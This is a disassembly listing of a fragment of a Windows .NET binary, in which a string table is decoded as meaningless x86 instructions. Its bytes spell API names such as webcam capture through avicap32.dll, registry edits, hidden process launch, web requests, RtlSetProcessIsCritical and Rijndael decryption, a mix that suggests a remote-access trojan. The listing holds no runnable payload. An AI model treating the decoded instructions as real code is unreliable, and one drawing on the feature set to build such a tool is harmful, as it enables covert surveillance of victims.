  40a078:	6d                   	insl   (%dx),%es:(%edi)
  40a079:	70 61                	jo     0x40a0dc
  40a07b:	72 65                	jb     0x40a0e2
  40a07d:	4f                   	dec    %edi
  40a07e:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a081:	63 74 45 71          	arpl   %esi,0x71(%ebp,%eax,2)
  40a085:	75 61                	jne    0x40a0e8
  40a087:	6c                   	insb   (%dx),%es:(%edi)
  40a088:	00 49 6e             	add    %cl,0x6e(%ecx)
  40a08b:	74 33                	je     0x40a0c0
  40a08d:	32 00                	xor    (%eax),%al
  40a08f:	53                   	push   %ebx
  40a090:	74 61                	je     0x40a0f3
  40a092:	72 74                	jb     0x40a108
  40a094:	73 57                	jae    0x40a0ed
  40a096:	69 74 68 00 53 74 6f 	imul   $0x706f7453,0x0(%eax,%ebp,2),%esi
  40a09d:	70 
  40a09e:	77 61                	ja     0x40a101
  40a0a0:	74 63                	je     0x40a105
  40a0a2:	68 00 46 72 6f       	push   $0x6f724600
  40a0a7:	6d                   	insl   (%dx),%es:(%edi)
  40a0a8:	53                   	push   %ebx
  40a0a9:	65 63 6f 6e          	arpl   %ebp,%gs:0x6e(%edi)
  40a0ad:	64 73 00             	fs jae 0x40a0b0
  40a0b0:	67 65 74 5f          	addr16 gs je 0x40a113
  40a0b4:	45                   	inc    %ebp
  40a0b5:	6c                   	insb   (%dx),%es:(%edi)
  40a0b6:	61                   	popa
  40a0b7:	70 73                	jo     0x40a12c
  40a0b9:	65 64 00 6f 70       	gs add %ch,%fs:0x70(%edi)
  40a0be:	5f                   	pop    %edi
  40a0bf:	47                   	inc    %edi
  40a0c0:	72 65                	jb     0x40a127
  40a0c2:	61                   	popa
  40a0c3:	74 65                	je     0x40a12a
  40a0c5:	72 54                	jb     0x40a11b
  40a0c7:	68 61 6e 00 53       	push   $0x53006e61
  40a0cc:	79 73                	jns    0x40a141
  40a0ce:	74 65                	je     0x40a135
  40a0d0:	6d                   	insl   (%dx),%es:(%edi)
  40a0d1:	2e 43                	cs inc %ebx
  40a0d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40a0d4:	6c                   	insb   (%dx),%es:(%edi)
  40a0d5:	6c                   	insb   (%dx),%es:(%edi)
  40a0d6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40a0db:	6e                   	outsb  %ds:(%esi),(%dx)
  40a0dc:	73 2e                	jae    0x40a10c
  40a0de:	47                   	inc    %edi
  40a0df:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a0e1:	65 72 69             	gs jb  0x40a14d
  40a0e4:	63 00                	arpl   %eax,(%eax)
  40a0e6:	4c                   	dec    %esp
  40a0e7:	69 73 74 60 31 00 41 	imul   $0x41003160,0x74(%ebx),%esi
  40a0ee:	64 64 00 47 65       	fs add %al,%fs:0x65(%edi)
  40a0f3:	74 50                	je     0x40a145
  40a0f5:	72 6f                	jb     0x40a166
  40a0f7:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a0fa:	73 65                	jae    0x40a161
  40a0fc:	73 00                	jae    0x40a0fe
  40a0fe:	67 65 74 5f          	addr16 gs je 0x40a161
  40a102:	4d                   	dec    %ebp
  40a103:	61                   	popa
  40a104:	69 6e 57 69 6e 64 6f 	imul   $0x6f646e69,0x57(%esi),%ebp
  40a10b:	77 54                	ja     0x40a161
  40a10d:	69 74 6c 65 00 49 73 	imul   $0x4e734900,0x65(%esp,%ebp,2),%esi
  40a114:	4e 
  40a115:	75 6c                	jne    0x40a183
  40a117:	6c                   	insb   (%dx),%es:(%edi)
  40a118:	4f                   	dec    %edi
  40a119:	72 45                	jb     0x40a160
  40a11b:	6d                   	insl   (%dx),%es:(%edi)
  40a11c:	70 74                	jo     0x40a192
  40a11e:	79 00                	jns    0x40a120
  40a120:	46                   	inc    %esi
  40a121:	75 6e                	jne    0x40a191
  40a123:	63 60 32             	arpl   %esp,0x32(%eax)
  40a126:	00 53 79             	add    %dl,0x79(%ebx)
  40a129:	73 74                	jae    0x40a19f
  40a12b:	65 6d                	gs insl (%dx),%es:(%edi)
  40a12d:	2e 43                	cs inc %ebx
  40a12f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a130:	72 65                	jb     0x40a197
  40a132:	00 53 79             	add    %dl,0x79(%ebx)
  40a135:	73 74                	jae    0x40a1ab
  40a137:	65 6d                	gs insl (%dx),%es:(%edi)
  40a139:	2e 4c                	cs dec %esp
  40a13b:	69 6e 71 00 45 6e 75 	imul   $0x756e4500,0x71(%esi),%ebp
  40a142:	6d                   	insl   (%dx),%es:(%edi)
  40a143:	65 72 61             	gs jb  0x40a1a7
  40a146:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  40a14a:	49                   	dec    %ecx
  40a14b:	45                   	inc    %ebp
  40a14c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a14d:	75 6d                	jne    0x40a1bc
  40a14f:	65 72 61             	gs jb  0x40a1b3
  40a152:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40a156:	31 00                	xor    %eax,(%eax)
  40a158:	41                   	inc    %ecx
  40a159:	6e                   	outsb  %ds:(%esi),(%dx)
  40a15a:	79 00                	jns    0x40a15c
  40a15c:	48                   	dec    %eax
  40a15d:	74 74                	je     0x40a1d3
  40a15f:	70 57                	jo     0x40a1b8
  40a161:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  40a165:	71 75                	jno    0x40a1dc
  40a167:	65 73 74             	gs jae 0x40a1de
  40a16a:	00 48 74             	add    %cl,0x74(%eax)
  40a16d:	74 70                	je     0x40a1df
  40a16f:	57                   	push   %edi
  40a170:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  40a174:	73 70                	jae    0x40a1e6
  40a176:	6f                   	outsl  %ds:(%esi),(%dx)
  40a177:	6e                   	outsb  %ds:(%esi),(%dx)
  40a178:	73 65                	jae    0x40a1df
  40a17a:	00 57 65             	add    %dl,0x65(%edi)
  40a17d:	62 52 65             	bound  %edx,0x65(%edx)
  40a180:	71 75                	jno    0x40a1f7
  40a182:	65 73 74             	gs jae 0x40a1f9
  40a185:	00 43 72             	add    %al,0x72(%ebx)
  40a188:	65 61                	gs popa
  40a18a:	74 65                	je     0x40a1f1
  40a18c:	00 73 65             	add    %dh,0x65(%ebx)
  40a18f:	74 5f                	je     0x40a1f0
  40a191:	55                   	push   %ebp
  40a192:	73 65                	jae    0x40a1f9
  40a194:	72 41                	jb     0x40a1d7
  40a196:	67 65 6e             	outsb  %gs:(%si),(%dx)
  40a199:	74 00                	je     0x40a19b
  40a19b:	73 65                	jae    0x40a202
  40a19d:	74 5f                	je     0x40a1fe
  40a19f:	41                   	inc    %ecx
  40a1a0:	6c                   	insb   (%dx),%es:(%edi)
  40a1a1:	6c                   	insb   (%dx),%es:(%edi)
  40a1a2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1a3:	77 41                	ja     0x40a1e6
  40a1a5:	75 74                	jne    0x40a21b
  40a1a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1a8:	52                   	push   %edx
  40a1a9:	65 64 69 72 65 63 74 	gs imul $0x73007463,%fs:0x65(%edx),%esi
  40a1b0:	00 73 
  40a1b2:	65 74 5f             	gs je  0x40a214
  40a1b5:	54                   	push   %esp
  40a1b6:	69 6d 65 6f 75 74 00 	imul   $0x74756f,0x65(%ebp),%ebp
  40a1bd:	73 65                	jae    0x40a224
  40a1bf:	74 5f                	je     0x40a220
  40a1c1:	4d                   	dec    %ebp
  40a1c2:	65 74 68             	gs je  0x40a22d
  40a1c5:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1c6:	64 00 57 65          	add    %dl,%fs:0x65(%edi)
  40a1ca:	62 52 65             	bound  %edx,0x65(%edx)
  40a1cd:	73 70                	jae    0x40a23f
  40a1cf:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1d0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1d1:	73 65                	jae    0x40a238
  40a1d3:	00 47 65             	add    %al,0x65(%edi)
  40a1d6:	74 52                	je     0x40a22a
  40a1d8:	65 73 70             	gs jae 0x40a24b
  40a1db:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1dc:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1dd:	73 65                	jae    0x40a244
  40a1df:	00 53 70             	add    %dl,0x70(%ebx)
  40a1e2:	61                   	popa
  40a1e3:	63 65 00             	arpl   %esp,0x0(%ebp)
  40a1e6:	45                   	inc    %ebp
  40a1e7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1e8:	64 73 57             	fs jae 0x40a242
  40a1eb:	69 74 68 00 67 65 74 	imul   $0x5f746567,0x0(%eax,%ebp,2),%esi
  40a1f2:	5f 
  40a1f3:	45                   	inc    %ebp
  40a1f4:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1f5:	74 72                	je     0x40a269
  40a1f7:	79 50                	jns    0x40a249
  40a1f9:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1fa:	69 6e 74 00 4d 65 74 	imul   $0x74654d00,0x74(%esi),%ebp
  40a201:	68 6f 64 42 61       	push   $0x6142646f
  40a206:	73 65                	jae    0x40a26d
  40a208:	00 50 61             	add    %dl,0x61(%eax)
  40a20b:	72 61                	jb     0x40a26e
  40a20d:	6d                   	insl   (%dx),%es:(%edi)
  40a20e:	65 74 65             	gs je  0x40a276
  40a211:	72 49                	jb     0x40a25c
  40a213:	6e                   	outsb  %ds:(%esi),(%dx)
  40a214:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a216:	00 47 65             	add    %al,0x65(%edi)
  40a219:	74 50                	je     0x40a26b
  40a21b:	61                   	popa
  40a21c:	72 61                	jb     0x40a27f
  40a21e:	6d                   	insl   (%dx),%es:(%edi)
  40a21f:	65 74 65             	gs je  0x40a287
  40a222:	72 73                	jb     0x40a297
  40a224:	00 45 6e             	add    %al,0x6e(%ebp)
  40a227:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40a22a:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40a231:	5f                   	pop    %edi
  40a232:	55                   	push   %ebp
  40a233:	54                   	push   %esp
  40a234:	46                   	inc    %esi
  40a235:	38 00                	cmp    %al,(%eax)
  40a237:	47                   	inc    %edi
  40a238:	65 74 42             	gs je  0x40a27d
  40a23b:	79 74                	jns    0x40a2b1
  40a23d:	65 73 00             	gs jae 0x40a240
  40a240:	61                   	popa
  40a241:	76 69                	jbe    0x40a2ac
  40a243:	63 61 70             	arpl   %esp,0x70(%ecx)
  40a246:	33 32                	xor    (%edx),%esi
  40a248:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a24b:	6c                   	insb   (%dx),%es:(%edi)
  40a24c:	00 4d 61             	add    %cl,0x61(%ebp)
  40a24f:	72 73                	jb     0x40a2c4
  40a251:	68 61 6c 41 73       	push   $0x73416c61
  40a256:	41                   	inc    %ecx
  40a257:	74 74                	je     0x40a2cd
  40a259:	72 69                	jb     0x40a2c4
  40a25b:	62 75 74             	bound  %esi,0x74(%ebp)
  40a25e:	65 00 55 6e          	add    %dl,%gs:0x6e(%ebp)
  40a262:	6d                   	insl   (%dx),%es:(%edi)
  40a263:	61                   	popa
  40a264:	6e                   	outsb  %ds:(%esi),(%dx)
  40a265:	61                   	popa
  40a266:	67 65 64 54          	addr16 gs fs push %esp
  40a26a:	79 70                	jns    0x40a2dc
  40a26c:	65 00 44 72 69       	add    %al,%gs:0x69(%edx,%esi,2)
  40a271:	76 65                	jbe    0x40a2d8
  40a273:	49                   	dec    %ecx
  40a274:	6e                   	outsb  %ds:(%esi),(%dx)
  40a275:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a277:	00 53 74             	add    %dl,0x74(%ebx)
  40a27a:	72 65                	jb     0x40a2e1
  40a27c:	61                   	popa
  40a27d:	6d                   	insl   (%dx),%es:(%edi)
  40a27e:	57                   	push   %edi
  40a27f:	72 69                	jb     0x40a2ea
  40a281:	74 65                	je     0x40a2e8
  40a283:	72 00                	jb     0x40a285
  40a285:	52                   	push   %edx
  40a286:	65 67 69 73 74 72 79 	imul   $0x43007972,%gs:0x74(%bp,%di),%esi
  40a28d:	00 43 
  40a28f:	75 72                	jne    0x40a303
  40a291:	72 65                	jb     0x40a2f8
  40a293:	6e                   	outsb  %ds:(%esi),(%dx)
  40a294:	74 55                	je     0x40a2eb
  40a296:	73 65                	jae    0x40a2fd
  40a298:	72 00                	jb     0x40a29a
  40a29a:	44                   	inc    %esp
  40a29b:	65 6c                	gs insb (%dx),%es:(%edi)
  40a29d:	65 74 65             	gs je  0x40a305
  40a2a0:	56                   	push   %esi
  40a2a1:	61                   	popa
  40a2a2:	6c                   	insb   (%dx),%es:(%edi)
  40a2a3:	75 65                	jne    0x40a30a
  40a2a5:	00 73 65             	add    %dh,0x65(%ebx)
  40a2a8:	74 5f                	je     0x40a309
  40a2aa:	43                   	inc    %ebx
  40a2ab:	72 65                	jb     0x40a312
  40a2ad:	61                   	popa
  40a2ae:	74 65                	je     0x40a315
  40a2b0:	4e                   	dec    %esi
  40a2b1:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2b2:	57                   	push   %edi
  40a2b3:	69 6e 64 6f 77 00 47 	imul   $0x4700776f,0x64(%esi),%ebp
  40a2ba:	65 74 44             	gs je  0x40a301
  40a2bd:	72 69                	jb     0x40a328
  40a2bf:	76 65                	jbe    0x40a326
  40a2c1:	73 00                	jae    0x40a2c3
  40a2c3:	67 65 74 5f          	addr16 gs je 0x40a326
  40a2c7:	49                   	dec    %ecx
  40a2c8:	73 52                	jae    0x40a31c
  40a2ca:	65 61                	gs popa
  40a2cc:	64 79 00             	fs jns 0x40a2cf
  40a2cf:	44                   	inc    %esp
  40a2d0:	72 69                	jb     0x40a33b
  40a2d2:	76 65                	jbe    0x40a339
  40a2d4:	54                   	push   %esp
  40a2d5:	79 70                	jns    0x40a347
  40a2d7:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40a2db:	74 5f                	je     0x40a33c
  40a2dd:	44                   	inc    %esp
  40a2de:	72 69                	jb     0x40a349
  40a2e0:	76 65                	jbe    0x40a347
  40a2e2:	54                   	push   %esp
  40a2e3:	79 70                	jns    0x40a355
  40a2e5:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40a2e9:	74 46                	je     0x40a331
  40a2eb:	69 6c 65 73 00 47 65 	imul   $0x74654700,0x73(%ebp,%eiz,2),%ebp
  40a2f2:	74 
  40a2f3:	54                   	push   %esp
  40a2f4:	65 6d                	gs insl (%dx),%es:(%edi)
  40a2f6:	70 46                	jo     0x40a33e
  40a2f8:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40a2ff:	00 
  40a300:	54                   	push   %esp
  40a301:	65 78 74             	gs js  0x40a378
  40a304:	57                   	push   %edi
  40a305:	72 69                	jb     0x40a370
  40a307:	74 65                	je     0x40a36e
  40a309:	72 00                	jb     0x40a30b
  40a30b:	57                   	push   %edi
  40a30c:	72 69                	jb     0x40a377
  40a30e:	74 65                	je     0x40a375
  40a310:	4c                   	dec    %esp
  40a311:	69 6e 65 00 67 65 74 	imul   $0x74656700,0x65(%esi),%ebp
  40a318:	5f                   	pop    %edi
  40a319:	53                   	push   %ebx
  40a31a:	74 61                	je     0x40a37d
  40a31c:	72 74                	jb     0x40a392
  40a31e:	75 70                	jne    0x40a390
  40a320:	50                   	push   %eax
  40a321:	61                   	popa
  40a322:	74 68                	je     0x40a38c
  40a324:	00 67 65             	add    %ah,0x65(%edi)
  40a327:	74 5f                	je     0x40a388
  40a329:	45                   	inc    %ebp
  40a32a:	78 65                	js     0x40a391
  40a32c:	63 75 74             	arpl   %esi,0x74(%ebp)
  40a32f:	61                   	popa
  40a330:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  40a334:	61                   	popa
  40a335:	74 68                	je     0x40a39f
  40a337:	00 73 65             	add    %dh,0x65(%ebx)
  40a33a:	74 5f                	je     0x40a39b
  40a33c:	45                   	inc    %ebp
  40a33d:	72 72                	jb     0x40a3b1
  40a33f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a340:	72 44                	jb     0x40a386
  40a342:	69 61 6c 6f 67 00 73 	imul   $0x7300676f,0x6c(%ecx),%esp
  40a349:	65 74 5f             	gs je  0x40a3ab
  40a34c:	55                   	push   %ebp
  40a34d:	73 65                	jae    0x40a3b4
  40a34f:	53                   	push   %ebx
  40a350:	68 65 6c 6c 45       	push   $0x456c6c65
  40a355:	78 65                	js     0x40a3bc
  40a357:	63 75 74             	arpl   %esi,0x74(%ebp)
  40a35a:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  40a35e:	6c                   	insb   (%dx),%es:(%edi)
  40a35f:	65 41                	gs inc %ecx
  40a361:	74 74                	je     0x40a3d7
  40a363:	72 69                	jb     0x40a3ce
  40a365:	62 75 74             	bound  %esi,0x74(%ebp)
  40a368:	65 73 00             	gs jae 0x40a36b
  40a36b:	53                   	push   %ebx
  40a36c:	65 74 41             	gs je  0x40a3b0
  40a36f:	74 74                	je     0x40a3e5
  40a371:	72 69                	jb     0x40a3dc
  40a373:	62 75 74             	bound  %esi,0x74(%ebp)
  40a376:	65 73 00             	gs jae 0x40a379
  40a379:	47                   	inc    %edi
  40a37a:	65 74 45             	gs je  0x40a3c2
  40a37d:	78 74                	js     0x40a3f3
  40a37f:	65 6e                	outsb  %gs:(%esi),(%dx)
  40a381:	73 69                	jae    0x40a3ec
  40a383:	6f                   	outsl  %ds:(%esi),(%dx)
  40a384:	6e                   	outsb  %ds:(%esi),(%dx)
  40a385:	00 49 6e             	add    %cl,0x6e(%ecx)
  40a388:	66 6f                	outsw  %ds:(%esi),(%dx)
  40a38a:	72 6d                	jb     0x40a3f9
  40a38c:	61                   	popa
  40a38d:	74 69                	je     0x40a3f8
  40a38f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a390:	6e                   	outsb  %ds:(%esi),(%dx)
  40a391:	00 41 72             	add    %al,0x72(%ecx)
  40a394:	72 61                	jb     0x40a3f7
  40a396:	79 00                	jns    0x40a398
  40a398:	55                   	push   %ebp
  40a399:	42                   	inc    %edx
  40a39a:	6f                   	outsl  %ds:(%esi),(%dx)
  40a39b:	75 6e                	jne    0x40a40b
  40a39d:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  40a3a1:	53                   	push   %ebx
  40a3a2:	74 72                	je     0x40a416
  40a3a4:	00 43 6f             	add    %al,0x6f(%ebx)
  40a3a7:	6d                   	insl   (%dx),%es:(%edi)
  40a3a8:	70 61                	jo     0x40a40b
  40a3aa:	72 65                	jb     0x40a411
  40a3ac:	4f                   	dec    %edi
  40a3ad:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a3b0:	63 74 45 71          	arpl   %esi,0x71(%ebp,%eax,2)
  40a3b4:	75 61                	jne    0x40a417
  40a3b6:	6c                   	insb   (%dx),%es:(%edi)
  40a3b7:	00 4e 6f             	add    %cl,0x6f(%esi)
  40a3ba:	74 4f                	je     0x40a40b
  40a3bc:	62 6a 65             	bound  %ebp,0x65(%edx)
  40a3bf:	63 74 00 47          	arpl   %esi,0x47(%eax,%eax,1)
  40a3c3:	65 74 44             	gs je  0x40a40a
  40a3c6:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  40a3cd:	69 65 73 00 43 72 65 	imul   $0x65724300,0x73(%ebp),%esp
  40a3d4:	61                   	popa
  40a3d5:	74 65                	je     0x40a43c
  40a3d7:	50                   	push   %eax
  40a3d8:	72 6f                	jb     0x40a449
  40a3da:	6a 65                	push   $0x65
  40a3dc:	63 74 45 72          	arpl   %esi,0x72(%ebp,%eax,2)
  40a3e0:	72 6f                	jb     0x40a451
  40a3e2:	72 00                	jb     0x40a3e4
  40a3e4:	5a                   	pop    %edx
  40a3e5:	65 72 6f             	gs jb  0x40a457
  40a3e8:	00 52 75             	add    %dl,0x75(%edx)
  40a3eb:	6e                   	outsb  %ds:(%esi),(%dx)
  40a3ec:	00 67 65             	add    %ah,0x65(%edi)
  40a3ef:	74 5f                	je     0x40a450
  40a3f1:	50                   	push   %eax
  40a3f2:	72 6f                	jb     0x40a463
  40a3f4:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a3f7:	73 4e                	jae    0x40a447
  40a3f9:	61                   	popa
  40a3fa:	6d                   	insl   (%dx),%es:(%edi)
  40a3fb:	65 00 6f 70          	add    %ch,%gs:0x70(%edi)
  40a3ff:	5f                   	pop    %edi
  40a400:	45                   	inc    %ebp
  40a401:	78 70                	js     0x40a473
  40a403:	6c                   	insb   (%dx),%es:(%edi)
  40a404:	69 63 69 74 00 6f 70 	imul   $0x706f0074,0x69(%ebx),%esp
  40a40b:	5f                   	pop    %edi
  40a40c:	45                   	inc    %ebp
  40a40d:	71 75                	jno    0x40a484
  40a40f:	61                   	popa
  40a410:	6c                   	insb   (%dx),%es:(%edi)
  40a411:	69 74 79 00 4d 61 72 	imul   $0x7372614d,0x0(%ecx,%edi,2),%esi
  40a418:	73 
  40a419:	68 61 6c 00 52       	push   $0x52006c61
  40a41e:	65 61                	gs popa
  40a420:	64 49                	fs dec %ecx
  40a422:	6e                   	outsb  %ds:(%esi),(%dx)
  40a423:	74 33                	je     0x40a458
  40a425:	32 00                	xor    (%eax),%al
  40a427:	54                   	push   %esp
  40a428:	6f                   	outsl  %ds:(%esi),(%dx)
  40a429:	55                   	push   %ebp
  40a42a:	49                   	dec    %ecx
  40a42b:	6e                   	outsb  %ds:(%esi),(%dx)
  40a42c:	74 65                	je     0x40a493
  40a42e:	67 65 72 00          	addr16 gs jb 0x40a432
  40a432:	4b                   	dec    %ebx
  40a433:	65 79 73             	gs jns 0x40a4a9
  40a436:	00 67 65             	add    %ah,0x65(%edi)
  40a439:	74 5f                	je     0x40a49a
  40a43b:	4e                   	dec    %esi
  40a43c:	65 77 4c             	gs ja  0x40a48b
  40a43f:	69 6e 65 00 55 49 6e 	imul   $0x6e495500,0x65(%esi),%ebp
  40a446:	74 33                	je     0x40a47b
  40a448:	32 00                	xor    (%eax),%al
  40a44a:	47                   	inc    %edi
  40a44b:	65 74 50             	gs je  0x40a49e
  40a44e:	72 6f                	jb     0x40a4bf
  40a450:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a453:	73 42                	jae    0x40a497
  40a455:	79 49                	jns    0x40a4a0
  40a457:	64 00 49 73          	add    %cl,%fs:0x73(%ecx)
  40a45b:	4e                   	dec    %esi
  40a45c:	75 6c                	jne    0x40a4ca
  40a45e:	6c                   	insb   (%dx),%es:(%edi)
  40a45f:	4f                   	dec    %edi
  40a460:	72 57                	jb     0x40a4b9
  40a462:	68 69 74 65 53       	push   $0x53657469
  40a467:	70 61                	jo     0x40a4ca
  40a469:	63 65 00             	arpl   %esp,0x0(%ebp)
  40a46c:	75 73                	jne    0x40a4e1
  40a46e:	65 72 33             	gs jb  0x40a4a4
  40a471:	32 2e                	xor    (%esi),%ch
  40a473:	64 6c                	fs insb (%dx),%es:(%edi)
  40a475:	6c                   	insb   (%dx),%es:(%edi)
  40a476:	00 4f 75             	add    %cl,0x75(%edi)
  40a479:	74 41                	je     0x40a4bc
  40a47b:	74 74                	je     0x40a4f1
  40a47d:	72 69                	jb     0x40a4e8
  40a47f:	62 75 74             	bound  %esi,0x74(%ebp)
  40a482:	65 00 53 65          	add    %dl,%gs:0x65(%ebx)
  40a486:	73 73                	jae    0x40a4fb
  40a488:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40a48f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a490:	67 45                	addr16 inc %ebp
  40a492:	76 65                	jbe    0x40a4f9
  40a494:	6e                   	outsb  %ds:(%esi),(%dx)
  40a495:	74 48                	je     0x40a4df
  40a497:	61                   	popa
  40a498:	6e                   	outsb  %ds:(%esi),(%dx)
  40a499:	64 6c                	fs insb (%dx),%es:(%edi)
  40a49b:	65 72 00             	gs jb  0x40a49e
  40a49e:	53                   	push   %ebx
  40a49f:	79 73                	jns    0x40a514
  40a4a1:	74 65                	je     0x40a508
  40a4a3:	6d                   	insl   (%dx),%es:(%edi)
  40a4a4:	45                   	inc    %ebp
  40a4a5:	76 65                	jbe    0x40a50c
  40a4a7:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4a8:	74 73                	je     0x40a51d
  40a4aa:	00 61 64             	add    %ah,0x64(%ecx)
  40a4ad:	64 5f                	fs pop %edi
  40a4af:	53                   	push   %ebx
  40a4b0:	65 73 73             	gs jae 0x40a526
  40a4b3:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  40a4ba:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4bb:	67 00 45 6e          	add    %al,0x6e(%di)
  40a4bf:	74 65                	je     0x40a526
  40a4c1:	72 44                	jb     0x40a507
  40a4c3:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40a4c7:	4d                   	dec    %ebp
  40a4c8:	6f                   	outsl  %ds:(%esi),(%dx)
  40a4c9:	64 65 00 4e 54       	fs add %cl,%gs:0x54(%esi)
  40a4ce:	64 6c                	fs insb (%dx),%es:(%edi)
  40a4d0:	6c                   	insb   (%dx),%es:(%edi)
  40a4d1:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  40a4d4:	6c                   	insb   (%dx),%es:(%edi)
  40a4d5:	00 52 74             	add    %dl,0x74(%edx)
  40a4d8:	6c                   	insb   (%dx),%es:(%edi)
  40a4d9:	53                   	push   %ebx
  40a4da:	65 74 50             	gs je  0x40a52d
  40a4dd:	72 6f                	jb     0x40a54e
  40a4df:	63 65 73             	arpl   %esp,0x73(%ebp)
  40a4e2:	73 49                	jae    0x40a52d
  40a4e4:	73 43                	jae    0x40a529
  40a4e6:	72 69                	jb     0x40a551
  40a4e8:	74 69                	je     0x40a553
  40a4ea:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  40a4ed:	00 53 79             	add    %dl,0x79(%ebx)
  40a4f0:	73 74                	jae    0x40a566
  40a4f2:	65 6d                	gs insl (%dx),%es:(%edi)
  40a4f4:	2e 53                	cs push %ebx
  40a4f6:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40a4fa:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  40a501:	70 
  40a502:	74 6f                	je     0x40a573
  40a504:	67 72 61             	addr16 jb 0x40a568
  40a507:	70 68                	jo     0x40a571
  40a509:	79 00                	jns    0x40a50b
  40a50b:	52                   	push   %edx
  40a50c:	69 6a 6e 64 61 65 6c 	imul   $0x6c656164,0x6e(%edx),%ebp
  40a513:	4d                   	dec    %ebp
  40a514:	61                   	popa
  40a515:	6e                   	outsb  %ds:(%esi),(%dx)
  40a516:	61                   	popa
  40a517:	67 65 64 00 49 43    	gs add %cl,%fs:0x43(%bx,%di)
  40a51d:	72 79                	jb     0x40a598
  40a51f:	70 74                	jo     0x40a595
  40a521:	6f                   	outsl  %ds:(%esi),(%dx)
  40a522:	54                   	push   %esp
  40a523:	72 61                	jb     0x40a586
  40a525:	6e                   	outsb  %ds:(%esi),(%dx)
  40a526:	73 66                	jae    0x40a58e
  40a528:	6f                   	outsl  %ds:(%esi),(%dx)
  40a529:	72 6d                	jb     0x40a598
  40a52b:	00 4d 44             	add    %cl,0x44(%ebp)
  40a52e:	35 43 72 79 70       	xor    $0x70797243,%eax
  40a533:	74 6f                	je     0x40a5a4
  40a535:	53                   	push   %ebx
  40a536:	65 72 76             	gs jb  0x40a5af
  40a539:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  40a540:	69 64 65 72 00 48 61 	imul   $0x73614800,0x72(%ebp,%eiz,2),%esp
  40a547:	73 
  40a548:	68 41 6c 67 6f       	push   $0x6f676c41
  40a54d:	72 69                	jb     0x40a5b8
  40a54f:	74 68                	je     0x40a5b9
  40a551:	6d                   	insl   (%dx),%es:(%edi)
  40a552:	00 43 6f             	add    %al,0x6f(%ebx)
  40a555:	6d                   	insl   (%dx),%es:(%edi)
  40a556:	70 75                	jo     0x40a5cd
  40a558:	74 65                	je     0x40a5bf
  40a55a:	48                   	dec    %eax
  40a55b:	61                   	popa
  40a55c:	73 68                	jae    0x40a5c6
  40a55e:	00 43 6f             	add    %al,0x6f(%ebx)
  40a561:	70 79                	jo     0x40a5dc
  40a563:	00 53 79             	add    %dl,0x79(%ebx)
  40a566:	6d                   	insl   (%dx),%es:(%edi)
  40a567:	6d                   	insl   (%dx),%es:(%edi)
  40a568:	65 74 72             	gs je  0x40a5dd
  40a56b:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40a572:	69 74 68 6d 00 73 65 	imul   $0x74657300,0x6d(%eax,%ebp,2),%esi
  40a579:	74 
  40a57a:	5f                   	pop    %edi
  40a57b:	4b                   	dec    %ebx
  40a57c:	65 79 00             	gs jns 0x40a57f
  40a57f:	43                   	inc    %ebx
  40a580:	69 70 68 65 72 4d 6f 	imul   $0x6f4d7265,0x68(%eax),%esi
  40a587:	64 65 00 73 65       	fs add %dh,%gs:0x65(%ebx)
  40a58c:	74 5f                	je     0x40a5ed
  40a58e:	4d                   	dec    %ebp
  40a58f:	6f                   	outsl  %ds:(%esi),(%dx)
  40a590:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  40a595:	65 61                	gs popa
  40a597:	74 65                	je     0x40a5fe
  40a599:	44                   	inc    %esp
  40a59a:	65 63 72 79          	arpl   %esi,%gs:0x79(%edx)
  40a59e:	70 74                	jo     0x40a614
